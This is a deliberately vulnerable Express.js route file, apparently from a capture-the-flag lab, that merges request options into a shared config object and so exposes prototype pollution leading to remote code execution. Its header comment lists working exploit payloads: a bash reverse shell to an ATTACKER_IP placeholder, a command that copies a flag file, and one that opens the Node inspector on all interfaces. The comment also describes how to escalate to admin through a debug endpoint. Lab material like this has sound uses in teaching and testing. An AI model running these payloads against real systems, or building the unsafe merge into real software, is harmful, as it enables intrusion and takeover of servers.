'use strict';

const express   = require('express');
const mergeDeep = require('merge-deep');   // ← v3.0.2: vulnerable to prototype pollution
const config    = require('../config');
const router    = express.Router();

/**
 * POST /api/v1/report/generate
 * Body: { "reportType": "string", "options": { ... } }
 *
 * Requires: req.session.user.is_admin === true
 * (Escalate via PUT /api/v1/internal/debug { "is_admin": true })
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * VULNERABILITY: Server-Side Prototype Pollution → Remote Code Execution
 *
 * merge-deep@3.0.2 processes the "__proto__" key as a real property and
 * assigns it onto Object.prototype, polluting the global object prototype.
 *
 * After pollution, property lookups on ANY plain object (including `config`)
 * resolve attacker-controlled values through the prototype chain.
 *
 * The setInterval cleanup loop in server.js then executes:
 *   spawn(config.shell, config.shellArgs, { env: {..., ...config.env} })
 *
 * Since config.shell / config.shellArgs / config.env now resolve via the
 * polluted prototype, this gives full RCE within ~30 seconds.
 *
 * ── EXPLOIT PAYLOADS ────────────────────────────────────────────────────────
 *
 * Reverse shell (replace ATTACKER_IP / PORT):
 * {
 *   "options": {
 *     "__proto__": {
 *       "shell":     "bash",
 *       "shellArgs": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
 *     }
 *   }
 * }
 *
 * Direct command + read Flag 3:
 * {
 *   "options": {
 *     "__proto__": {
 *       "shell":     "sh",
 *       "shellArgs": ["-c", "cat /var/www/flag2.txt > /tmp/f && chmod 777 /tmp/f"]
 *     }
 *   }
 * }
 *
 * Open Node.js debugger (attach via Chrome DevTools / node-inspect):
 * {
 *   "options": {
 *     "__proto__": {
 *       "shell":     "node",
 *       "shellArgs": ["-e", "process.mainModule.require('child_process').execSync('id')"],
 *       "env":       { "NODE_OPTIONS": "--inspect=0.0.0.0:9229" }
 *     }
 *   }
 * }
 * ─────────────────────────────────────────────────────────────────────────────
 */
router.post('/generate', (req, res) => {
  if (!req.session.user || req.session.user.is_admin !== true) {
    return res.status(403).json({
      error: 'Forbidden. Admin clearance required to generate reports.'
    });
  }

  const { reportType = 'standard', options = {} } = req.body;

  // VULNERABLE: user-supplied `options` merged directly into shared config object.
  // A "__proto__" key inside `options` will pollute Object.prototype.
  mergeDeep(config, options);

  return res.json({
    status:     'queued',
    reportType,
    message:    'Report generation queued. Output available within 30 seconds.',
    configSnap: JSON.stringify(config)
  });
});

/**
 * GET /api/v1/report/status
 */
router.get('/status', (req, res) => {
  if (!req.session.user || req.session.user.is_admin !== true) {
    return res.status(403).json({ error: 'Forbidden.' });
  }

  res.json({
    queueDepth: 0,
    lastRun:    new Date().toISOString(),
    configSnap: JSON.stringify(config)
  });
});

module.exports = router;
